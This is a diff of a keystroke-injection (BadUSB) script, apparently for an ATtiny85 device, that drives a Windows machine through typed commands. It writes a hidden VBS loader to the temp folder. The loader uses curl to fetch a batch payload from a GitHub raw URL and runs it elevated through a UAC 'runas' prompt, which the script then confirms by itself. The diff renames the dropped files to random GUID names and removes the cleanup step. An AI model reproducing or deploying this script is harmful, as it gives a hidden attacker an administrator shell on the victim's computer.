@@ -1,6 +1,6 @@
 @start
 @rem copy dash character to environment variable
-fn_run@@
+fn_run@@@@
 cmd
 key_enter@@@@
 cmd &c exit 45
@@ -11,26 +11,22 @@ exit
 key_enter
 
 @rem change locale
-fn_run@@
+fn_run@@@@
 Powershell %DASH%Windowstzle Hidden Set%DASH%WinUserLanguageList %DASH%LanguageList en%DASH%US %DASH%force
 key_enter@@@@
 
 @rem create an invisible admin shell fetching and running the full script
-fn_run@@
-cmd /k cd %temp%&copy con loader.vbs
+fn_run@@@@
+cmd /k cd %temp%&copy con fb05c66d-c6c1-4347-9330-d9a3c0bca994.tmp.vbs
 key_enter@@@@
-CreateObject("Shell.Application").ShellExecute "cmd","/k curl -m 10 --retry 20 -o %temp%\script.bat https://raw.githubusercontent.com/8AC2BC7E026226F2856A9DA8C4033927/attiny85-injection/main/injection/full_script.bat&%temp%\script.bat","","runas",0
+CreateObject("Shell.Application").ShellExecute "cmd","/k curl -m 10 --retry 20 -o %temp%/fac87289-05e8-43e6-8e98-610bb78561b4.tmp.bat https://raw.githubusercontent.com/8AC2BC7E026226F2856A9DA8C4033927/attiny85-injection/main/injection/payload.bat&%temp%/fac87289-05e8-43e6-8e98-610bb78561b4.tmp.bat","","runas",0
 key_enter
 fn_keyboard_interrupt@
 
 @rem launch the invisible shell and elevate it using uac
-loader.vbs&exit
+fb05c66d-c6c1-4347-9330-d9a3c0bca994.tmp.vbs&exit
 key_enter@@@@
 key_arrow_left
 key_enter
 
-@end
-@rem reset local amd remove temporary environment variable
-fn_run@
-Powershell %DASH%Windowstyle Hidden Set%DASH%WinUserLanguageList %DASH%LanguageList de%DASH%DE %DASH%force; [Environment]::SetEnvironmentVariable('DASH', $null, 'User')
-key_enter
+@rem ducky finished, invisible shell takes over
